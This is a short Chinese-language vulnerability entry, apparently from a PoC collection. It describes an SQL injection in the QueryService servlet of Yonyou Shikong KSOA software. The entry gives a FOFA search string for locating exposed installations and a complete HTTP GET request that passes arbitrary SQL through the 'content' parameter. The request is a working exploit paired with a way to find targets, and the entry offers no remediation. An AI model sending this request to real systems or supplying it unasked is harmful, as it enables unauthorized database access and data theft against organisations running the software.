## 用友时空KSOA接口com.sksoft.bill.QueryService存在SQL注入漏洞

用友时空KSOA /servlet/com.sksoft.bill.QueryService  存在sql注入漏洞，导致数据泄露。

## fofa

```yaml
app="用友-时空KSOA"
```

## poc

```yaml
GET /servlet/com.sksoft.bill.QueryService?service=query&content=SELECT%20HashBytes('md5','NjTFtj4Q'); HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Maxthon/4.4.3.4000 Chrome/30.0.1599.101 Safari/537.36
Accept-Encoding: gzip, deflate, br
Connection: close
```

![image-20240709134924259](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202407091349312.png)